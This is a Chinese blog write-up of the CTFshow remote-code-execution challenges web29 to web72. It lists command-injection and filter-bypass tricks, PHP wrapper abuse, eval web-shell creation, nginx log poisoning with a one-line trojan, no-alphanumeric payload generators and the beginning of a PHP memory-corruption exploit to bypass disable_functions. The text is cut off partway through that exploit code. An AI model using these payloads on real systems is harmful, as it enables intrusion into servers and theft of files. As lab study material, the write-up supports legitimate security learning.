<hr>
<h2 id="title-EZrcedate-2024-06-03-13-07-17tags-Rce-CTFshowcategories-安全相关-Web"><a href="#title-EZrcedate-2024-06-03-13-07-17tags-Rce-CTFshowcategories-安全相关-Web" class="headerlink" title="title: EZrcedate: 2024-06-03 13:07:17tags:- Rce- CTFshowcategories:- [安全相关, Web]"></a>title: EZrce<br>date: 2024-06-03 13:07:17<br>tags:<br>- Rce<br>- CTFshow<br>categories:<br>- [安全相关, Web]</h2><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><h4 id="用于命令执行的常见姿势"><a href="#用于命令执行的常见姿势" class="headerlink" title="用于命令执行的常见姿势"></a>用于命令执行的常见姿势</h4><p>system</p>
<p>exec</p>
<p>passthru</p>
<p>shell_exec</p>
<p>include(文件包含漏洞，配合php伪协议)</p>
<h4 id="一些常见的绕过方式"><a href="#一些常见的绕过方式" class="headerlink" title="一些常见的绕过方式"></a>一些常见的绕过方式</h4><h5 id="Windows支持："><a href="#Windows支持：" class="headerlink" title="Windows支持："></a>Windows支持：</h5><p>|直接执行后面的语句 ping 127.0.0.1|whoami<br>||前面出错执行后面的 ，前面为假 ping 2||whoami<br>&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p>
<p>%0a 回车</p>
<p>%1a 作为.bat文件的命令分隔符</p>
<h5 id="Linux支持"><a href="#Linux支持" class="headerlink" title="Linux支持:"></a>Linux支持:</h5><p>;前面的执行完执行后面的 ping 127.0.0.1;whoami<br>|管道符，显示后面的执行结果 ping 127.0.0.1|whoami<br>||当前面的执行出错时执行后面的 ping 1||whoami<br>&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p>
<p>%0a 回车</p>
<p>%0d 换行</p>
<h5 id="过滤空格绕过"><a href="#过滤空格绕过" class="headerlink" title="过滤空格绕过"></a>过滤空格绕过</h5><p>使用&lt;代替空格</p>
<p>使用${IFS}代替空格</p>
<blockquote>
<p>IFS变量的相关信息：</p>
<ul>
<li>Shell把变量IFS内的每一个字符都当做是一个分割符(delimeter)，用这些字符作为每一个字段的结束符来进行分割。</li>
<li>如果IFS没有设置，或者IFS的值被设置为”\t\n”(space, tab和 newline)，那么操作对象的开始和结束处的所有space, tab和newline序列都将被忽略，但是操作对象中间的space, tab和newline序列会作为界定符工作。</li>
<li>如果IFS值不是默认值(例如程序中对IFS进行设置过)，只有出现在IFS内的空白字符(可能是space, tab或newline中的一个或几个)才会在单词开始和结束处被忽略，这里说的是单词，而不是整个操作对象。</li>
<li>IFS内的非空白字符多个连续出现时，每个非空白字符会被当做单独的分隔符看待，但是多个连续的空白字符会被当做一个分隔符看待。</li>
<li>如果IFS为空(“null”)，则不会进行单词分割。</li>
</ul>
</blockquote>
<p>使用$IFS代替空格</p>
<h5 id="过滤斜杠-绕过"><a href="#过滤斜杠-绕过" class="headerlink" title="过滤斜杠&#x2F;绕过"></a>过滤斜杠&#x2F;绕过</h5><p>使用${HOME:0:1}代替</p>
<h5 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h5><p>PHP 伪协议是 PHP 支持的协议与封装协议，几个 PHP 支持的伪协议如下。</p>
<table>
<thead>
<tr>
<th>伪协议</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>file:&#x2F;&#x2F;</td>
<td>访问本地文件系统</td>
</tr>
<tr>
<td>http:&#x2F;&#x2F;</td>
<td>访问 HTTP(s) 网址</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;</td>
<td>访问各个输入&#x2F;输出流</td>
</tr>
<tr>
<td>phar:&#x2F;&#x2F;</td>
<td>PHP 归档</td>
</tr>
<tr>
<td>zip:&#x2F;&#x2F;</td>
<td>压缩流</td>
</tr>
</tbody></table>
<p>例如在 allow_url_include &#x3D; on 时服务器上有个文件叫 index.php，且存在文件包含漏洞，这个时候就能用 php 伪协议直接把文件显示出来。</p>
<pre><code>?file=php://filter/read=convert.base64-encode/resource=index.php
</code></pre>
<p>稍微解释下这个做法，php:&#x2F;&#x2F;filter&#x2F; 是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F; 表示读取的方式是 base64 编码后，resource&#x3D;index.php 表示目标文件为index.php。问什么要进行 base64 编码呢？如果不进行 base64 编码传入，index.php 就会直接执行，我们就看不到文件中的内容了。php 协议还常用 php:&#x2F;&#x2F;input，这可以访问请求的原始数据的只读流，可以读取 POST 请求的参数。</p>
<h5 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data 伪协议"></a>data 伪协议</h5><p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为:</p>
<pre><code>data://text/plain;base64,xxxx(base64编码后的数据)
</code></pre>
<h5 id="无回显命令执行"><a href="#无回显命令执行" class="headerlink" title="无回显命令执行"></a>无回显命令执行</h5><p>1.tee 从标准输入读取，再写入标准输出和文件。</p>
<p>2.反弹shell</p>
<p>3.dnslog外带</p>
<h5 id="下划线的正则绕过"><a href="#下划线的正则绕过" class="headerlink" title="下划线的正则绕过"></a>下划线的正则绕过</h5><p> 这个正则的绕过方法就是利用特性来绕过，可以用</p>
<p>　[</p>
<p> (空格)</p>
<p> + 　</p>
<p> .</p>
<p>上面那几个字符任何一个都行，都可以被处理成_</p>
<h3 id="web29-124"><a href="#web29-124" class="headerlink" title="web29-124"></a>web29-124</h3><h4 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h4><p>只是过滤了简单的flag字符，直接使用system函数</p>
<p>Payload:</p>
<blockquote>
<p>1、用egrep效果一样egrep&#x3D;grep  -E<br>c&#x3D;system(“cat fl<em>g.php | grep  -E ‘fl.g’ “);<br>2、此种方式需要右键源代码<br>c&#x3D;system(“cat fl</em>g.php”);<br>3、</p>
<p>c&#x3D;system(“tac fl<em>g.php”);<br>4、倒序输出文本<br>c&#x3D;system(“tac fl</em>ag.php”);<br>5、<br>c&#x3D;system(“cp fl*g.php a.txt “);<br>访问&#x2F;a.txt<br>6、直接输出一个php这样就可以直接利用代码了,注意也是右键查看源代码<br>c&#x3D;system(‘echo -e “ &lt;?php \n error_reporting(0); \n  $c&#x3D; $_GET[&#39;c&#39;]; \n eval($c); “ &gt; a.php’);<br>&#x2F;a.php?c&#x3D;system(“tac flag.php”);</p>
</blockquote>
<h4 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h4><p>过滤了system函数，可以用反引号来命令执行</p>
<p>Payload:</p>
<blockquote>
<p>1、nl命令，带着行号输出文本内容<br>c&#x3D;echo <code>nl fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl*ag.p*hp</code>;<br>echo <code>cp fl*ag.p*hp 1.txt | cat 1.txt</code>;<br>单引号：引号里面的内容会原封不动的显示出来（很简单，不做解释）<br>双引号：里面的特殊符号会被解析，变量也会被替换（\ 符号、空格会被解析）<br>echo \a -&gt; a<br>echo “\a” -&gt; \a<br>2、passthru函数，同system，同理exec，shell_exec也可以用，不过有点麻烦<br>c&#x3D;passthru(“cat fla*”);<br>c&#x3D;exec(passthru(“cat fla*”));<br>c&#x3D;shell_exec(passthru(“cat fla*”));</p>
</blockquote>
<h4 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h4><p>题目过滤了空格，单引号，小数点，</p>
<p>过滤了空格，可以使用%09替代；也可以使用{$IFS}，因为单引号被过滤了，所以如果使用c&#x3D;passthru(“cat%09fla*”);或者{$IFS}都不会被解释为空格</p>
<p>所以构造如下Payload:</p>
<blockquote>
<p>1、使用eval嵌套。具体参数：passthru 结合%09，也可以直接rce，因为没有对其他参数进行过滤<br>其中%09绕过空格 ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac%09fla*”); 这里需要注意括号的闭合，&amp;的连接。<br>2、使用参数：passthru结合 $IFS$9<br>其中$IFS$9绕过空格，注意转义$符号 ?<br>$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串。c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac$IFS$9fla*”);<br>3、使用未被过滤的命令。passthru直接读取<br>?c&#x3D;passthru(%22tac$IFS$9fla*%22); 也就是passthru(“tac$IFS$9fla*”);<br>4、使用pos(localeconv)来获取小数点<br>localeconv可以返回包括小数点在内的一个数组；pos去取出数组中当前第一个元素，也就是小数点。 scandir可以结合它扫描当前目录内容。 ?c&#x3D;print_r(scandir(pos(localeconv()))); 可以看到当前目录下有flag.php 通过array_reverse把数组逆序，通过next取到第二个数组元素，也即flag.php 然后?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</p>
</blockquote>
<h4 id="web32-nginx日志注入"><a href="#web32-nginx日志注入" class="headerlink" title="web32(nginx日志注入)"></a>web32(nginx日志注入)</h4><p>过滤掉了flag|system|php|cat|sort|shell|.| |’|&#96;|echo|;|( 包括点，单引号，反引号，分号，括号</p>
<p>所以这里需要使用include来构造Payload:</p>
<blockquote>
<p>1、?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>其中?&gt;代替分号，页面会显示flag.php内容的base64编码，解码即可获取flag<br>还有一种方法，日志注入<br>2、?c&#x3D;include$_GET[1]?%3E&amp;1&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可</p>
<p>3、?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;input</p>
<p>也可以使用php:&#x2F;&#x2F;input然后使用post执行命令<?php system("cat flag.php")?></p>
</blockquote>
<h4 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h4><p>相比上一关只多过滤了“</p>
<p>所以web32Payload依旧适用</p>
<h4 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h4><p>多过滤一个:  之前payload依旧适用</p>
<h4 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h4><p>多过滤一个&#x3D; &lt;   之前payload依旧适用</p>
<h4 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h4><p>多过滤了数字  GET参数改为a即可</p>
<h4 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h4><pre><code class="php">if(!preg match(&quot;/flag/i&quot;，$c)){
    include($c);
    echo $flag;
    }
</code></pre>
<blockquote>
<p>1、使用php:&#x2F;&#x2F;input POST写入php代码</p>
<?php system("cat fla*")?>

<p>2、使用data协议</p>
<p>c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p>
<?php 
system("tac flag.php")
?>
</blockquote>
<h4 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h4><p>web37Payload照样打</p>
<h4 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h4><pre><code class="php">if(!preg_match(&quot;/flag/i&quot;, $c)){
        include($c.&quot;.php&quot;);
    } 
</code></pre>
<p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php%20system("tac fla*.php");?><br>?&gt;为php结束符号，后面拼接的.php会被忽略掉，不用管</p>
<h4 id="web40-数组函数"><a href="#web40-数组函数" class="headerlink" title="web40(数组函数)"></a>web40(数组函数)</h4><pre><code class="php">if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c)){
        eval($c);
    }
     
</code></pre>
<p>这次添加了很多过滤，之前方法大多都不行了</p>
<blockquote>
<p>1、c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p>
<p>getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())</p>
<p>localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为”.”</p>
<p>pos():输出数组第一个元素，不改变指针；</p>
<p>current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样</p>
<p>scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为”.”所以遍历当前目录</p>
<p>array_reverse():数组逆置</p>
<p>next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以</p>
<p>show_source():查看源码</p>
<p>pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。</p>
<p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p>
<p>提示：该函数不会移动数组内部指针。</p>
<p>相关的方法：</p>
<p>current()返回数组中的当前元素的值。</p>
<p>end()将内部指针指向数组中的最后一个元素，并输出。</p>
<p>next()将内部指针指向数组中的下一个元素，并输出。</p>
<p>prev()将内部指针指向数组中的上一个元素，并输出。</p>
<p>reset()将内部指针指向数组中的第一个元素，并输出。</p>
<p>each()返回当前元素的键名和键值，并将内部指针向前移动。</p>
<p>2、c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;需要POST传入参数为1&#x3D;system(‘tac fl*’);</p>
<p>同理?cmd&#x3D;system(“tac%20flag.php”);&amp;c&#x3D;eval(pos(pos(get_defined_vars())));</p>
<p>get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。</p>
<p>next()将内部指针指向数组中的下一个元素，并输出。</p>
<p>array_pop() 函数删除数组中的最后一个元素并返回其值。</p>
<p>3、c&#x3D;session_start();system(session_id());<br>      passid&#x3D;ls</p>
<p><img src="/EZrce/web40.png" alt="web40"></p>
<p>通过cookie获得参数进行命令执行</p>
<p>受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的。</p>
</blockquote>
<h4 id="web41-rce-or"><a href="#web41-rce-or" class="headerlink" title="web41(rce_or)"></a>web41(rce_or)</h4><pre><code class="php">if(!preg_match(&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i&#39;, $c)){
        eval(&quot;echo($c);&quot;);
    } 
</code></pre>
<p>过滤了<code>$、+、-、^、~</code>使得<strong>异或自增和取反</strong>构造字符都无法使用，同时过滤了字母和数字。但是特意留了个<code>|</code>运算符</p>
<p>根据正则匹配生成可用字符的集合rce_or.php</p>
<pre><code class="php">&lt;?php
$myfile = fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);
$contents=&quot;&quot;;
for ($i=0; $i &lt; 256; $i++) { 
    for ($j=0; $j &lt;256 ; $j++) { 

        if($i&lt;16){
            $hex_i=&#39;0&#39;.dechex($i);
        }
        else{
            $hex_i=dechex($i);
        }
        if($j&lt;16){
            $hex_j=&#39;0&#39;.dechex($j);
        }
        else{
            $hex_j=dechex($j);
        }
        $preg = &#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i&#39;;
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
                    echo &quot;&quot;;
    }
  
        else{
        $a=&#39;%&#39;.$hex_i;
        $b=&#39;%&#39;.$hex_j;
        $c=(urldecode($a)|urldecode($b));
        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) {
            $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;
        }
    }

}
}
fwrite($myfile,$contents);
fclose($myfile);
</code></pre>
<p>根据可用的字符生成Payload</p>
<pre><code class="python"># -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os
def action(arg):
   s1=&quot;&quot;
   s2=&quot;&quot;
   for i in arg:
       f=open(&quot;rce_or.txt&quot;,&quot;r&quot;)
       while True:
           t=f.readline()
           if t==&quot;&quot;:
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;
   return(output)
   
while True:
   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))
   print(&quot;\n[*] result:\n&quot;+param)
</code></pre>
<p><img src="/EZrce/web41.png"></p>
<h4 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h4><pre><code class="php">$c=$_GET[&#39;c&#39;];
    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); 
</code></pre>
<p>Payload:</p>
<blockquote>
<p>?c&#x3D;cat flag.php;  ?c&#x3D;cat flag.php||  ?c&#x3D;cat flag.php%26(&amp;)    c&#x3D;nl flag.php%0a  ?c&#x3D;echo <code>tac fl*</code>||</p>
<p>使用 “ ; “ “ || “ “ &amp; “ “ &amp;&amp; “ 分隔</p>
<p>&#x2F;dev&#x2F;null 2&gt;&amp;1 意思是将标准输出和标准错误都重定向到 &#x2F;dev&#x2F;null 即不回显<br>; 	分号<br>| 	只执行后面那条命令<br>|| 	只执行前面那条命令<br>&amp; 	两条命令都会执行<br>&amp;&amp; 	两条命令都会执行</p>
</blockquote>
<h4 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h4><p>多过滤了cat,\和；，使用其他Payload即可</p>
<h4 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h4><p>多过滤了flag，使用fla*即可</p>
<h4 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h4><p>过滤了空格，使用$IFS或者%09绕过即可</p>
<h4 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h4><p>过滤了$和*，Payload如下：</p>
<blockquote>
<p>1、?c&#x3D;nl&lt;fla’’g.php||</p>
<p>2、?c&#x3D;ca\t&lt;fl\ag.php||</p>
</blockquote>
<h4 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h4><pre><code class="php">preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;, $c)
</code></pre>
<p>Payload:</p>
<blockquote>
<p>tac%09fl’’ag.php||</p>
<p>…….</p>
</blockquote>
<h4 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h4><pre><code class="php">preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;, $c)
</code></pre>
<p>多过滤了一些函数，不过之前Payload可以继续打</p>
<h4 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h4><pre><code class="php">preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;, $c)
</code></pre>
<p>过滤了%，但是可以&lt;</p>
<h4 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h4><pre><code class="php">preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c)
</code></pre>
<p>同上</p>
<h4 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h4><pre><code class="php">preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c)
</code></pre>
<p>ban了tac但是可以用nl</p>
<h4 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h4><p>ban了&lt;&gt;，但是可以用$IFS,而且这次flag放在了根目录</p>
<p>Payload:</p>
<blockquote>
<p>?c&#x3D;nl$IFS&#x2F;fl’’ag||</p>
</blockquote>
<h4 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h4><pre><code class="php">if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)){
        echo($c);
        $d = system($c);
        echo &quot;&lt;br&gt;&quot;.$d;
    }else{
        echo &#39;no&#39;;
    }
</code></pre>
<p>Payload:</p>
<blockquote>
<p>1、?c&#x3D;ta’’c${IFS}f’’lag.php</p>
<p>2、s’’ort${IFS}f???????%0a</p>
</blockquote>
<h4 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h4><pre><code class="php">if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)){
        system($c);
    }
</code></pre>
<p>Payload:</p>
<blockquote>
<p>1、?c&#x3D;&#x2F;bin&#x2F;?at${IFS}f???????</p>
<p>2、mv flag.php t.txt</p>
</blockquote>
<h4 id="web55-无数字字母的命令执行"><a href="#web55-无数字字母的命令执行" class="headerlink" title="web55(无数字字母的命令执行)"></a>web55(无数字字母的命令执行)</h4><pre><code class="php">preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)
</code></pre>
<p>过滤了所有字母</p>
<p><img src="/EZrce/web55.png"></p>
<p>利用post上传文件，然后使用.(source)执行，一般上传后文件在&#x2F;tmp&#x2F;php?????[@-[]</p>
<p><img src="/EZrce/web55_2.png"></p>
<p>[参考文章]: <a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a>	“无字母数字的命令执行”</p>
<h4 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h4><p>方法同上</p>
<h4 id="web57-取反"><a href="#web57-取反" class="headerlink" title="web57(取反)"></a>web57(取反)</h4><pre><code class="php">//flag in 36.php 
preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#39;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c)
</code></pre>
<p>过滤了字母数字</p>
<p>通过<code>$(())</code>操作构造出36： <code>$(())</code> ：代表做一次运算，因为里面为空，也表示值为0</p>
<p><code>$(( ~$(()) )) </code>：对0作取反运算，值为-1</p>
<p><code>$(( $((~$(()))) $((~$(()))) ))</code>： -1-1，也就是(-1)+(-1)为-2，所以值为-2</p>
<p><code>$(( ~$(( $((~$(()))) $((~$(()))) )) )) </code>：再对-2做一次取反得到1，所以值为1</p>
<p>故我们在<code>$(( ~$(( )) ))</code>里面放37个<code>$((~$(())))</code>，得到-37，取反即可得到36</p>
<p>Payload:</p>
<blockquote>
<p>?c&#x3D;$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</p>
</blockquote>
<h4 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h4><pre><code class="php">if(isset($_POST[&#39;c&#39;])){
        $c= $_POST[&#39;c&#39;];
        eval($c);
}
</code></pre>
<p>Payload:</p>
<blockquote>
<p>1、c&#x3D;show_source(‘flag.php’);</p>
<p>2、c&#x3D;highlight_file(“flag.php”);</p>
<p>3、c&#x3D;include($_POST[‘w’]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>4、c&#x3D;include(“flag.php”);var_dump(get_defined_vars());</p>
</blockquote>
<h4 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h4><p>Payload同上</p>
<h4 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h4><p>Payload同上</p>
<h4 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h4><p>Payload同上</p>
<h4 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h4><p>Payload同上，不过ban了highlight_file函数</p>
<h4 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h4><p>Payload同上</p>
<h4 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h4><p>Payload同上</p>
<h4 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h4><p>ban了show_source,然后使用php伪协议读取flag.php时，源码显示flag不在这，于是使用data协议读取根目录看到flag.txt</p>
<pre><code class="php">&lt;?php 
print_r(scandir(&#39;/&#39;));
?&gt;
</code></pre>
<p><img src="/EZrce/web65.png"></p>
<p>因为大部分直接可以命令执行的函数被ban了，看了wp没想到highlight_file没被ban</p>
<h4 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h4><p>Payload同上</p>
<h4 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h4><p>highlight_file被ban了，但是可以直接用php伪协议读取</p>
<h4 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h4><p>Payload同上</p>
<p>implode：把数组元素组合为字符串</p>
<p>冷门函数：读取函数readgzfile：可以读取非gz格式的文件</p>
<p>Payload：</p>
<blockquote>
<p>1、?c&#x3D;echo(implode(‘—‘,scandir(“&#x2F;“)));</p>
<p>2、?c&#x3D;readgzfile(‘&#x2F;flag.txt’);</p>
</blockquote>
<h4 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h4><p>虽然有几个报错但是flag还是出来了</p>
<h4 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h4><pre><code class="php">if(isset($_POST[&#39;c&#39;])){
        $c= $_POST[&#39;c&#39;];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);
}else{
    highlight_file(__FILE__);
}
</code></pre>
<p>虽然php伪协议可以读，但是结果把数字字母替换了，但是可以执行php代码让后面的匹配缓冲区不执行直接退出exit或die</p>
<p>Payload:</p>
<blockquote>
<p>c&#x3D;readgzfile(‘&#x2F;flag.txt’);exit(0);</p>
<p>c&#x3D;include(‘&#x2F;flag.txt’);exit(0);</p>
</blockquote>
<h4 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h4><p>Payload同上</p>
<h4 id="web72-glob协议-waf绕过"><a href="#web72-glob协议-waf绕过" class="headerlink" title="web72(glob协议+waf绕过)"></a>web72(glob协议+waf绕过)</h4><p>flag不在&#x2F;下了，但是很多查询的函数被ban了</p>
<p>使用glob:&#x2F;&#x2F;伪协议绕过open_basedir</p>
<p>glob可以遍历目录，并且不受disable_functions的限制。</p>
<pre><code class="php">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob://./*&quot;);
foreach($a as $f)
{
   echo($f-&gt;__toString().&#39; &#39;);
}
exit(0);
?&gt;
</code></pre>
<p>仔细看看这个代码</p>
<pre><code class="php">&lt;?php
$a=new DirectoryIterator(&quot;glob:///*&quot;);  
    # 利用DirectoryIterator($path)可以实现遍历目录下的所有文件
    # glob:// — 查找匹配的文件路径模式
    # DirectoryIterator(&quot;glob:///*&quot;)   遍历根目录里所有文件
foreach($a as $f)  	#循环遍历输出，并以空格为分隔
{echo($f-&gt;__toString().&#39; &#39;);
} exit(0);
?&gt;
</code></pre>
<p>其实不加前面<code>?&gt;&lt;?php</code>也是可以的。eval里的语句可以视为在当前php文件里加了几条语句，这些语句必须是完整的，即必须以<code>;</code>或者<code>?&gt;</code>结尾来结束语句，但是eval里的?&gt;不会闭合当前的php文件，所以当前php页面后续的语句都是会执行的。</p>
<p>可以看一下下面的图片，eval里的语句可以修改文件的变量值，但是<code>?&gt;</code>并不会闭合外面的PHP语句。<br><img src="/EZrce/web72.png" alt="在这里插入图片描述"></p>
<pre><code class="php">c=function ctfshow($cmd) { global $abc, $helper, $backtrace;

class Vuln {
    public $a;
    public function __destruct() { 
        global $backtrace; 
        unset($this-&gt;a);
        $backtrace = (new Exception)-&gt;getTrace();
        if(!isset($backtrace[1][&#39;args&#39;])) {
            $backtrace = debug_backtrace();
        }
    }
}

class Helper {
    public $a, $b, $c, $d;
}

function str2ptr(&amp;$str, $p = 0, $s = 8) {
    $address = 0;
    for($j = $s-1; $j &gt;= 0; $j--) {
        $address &lt;&lt;= 8;
        $address |= ord($str[$p+$j]);
    }
    return $address;
}

function ptr2str($ptr, $m = 8) {
    $out = &quot;&quot;;
    for ($i=0; $i &lt; $m; $i++) {
        $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));
        $ptr &gt;&gt;= 8;
    }
    return $out;
}

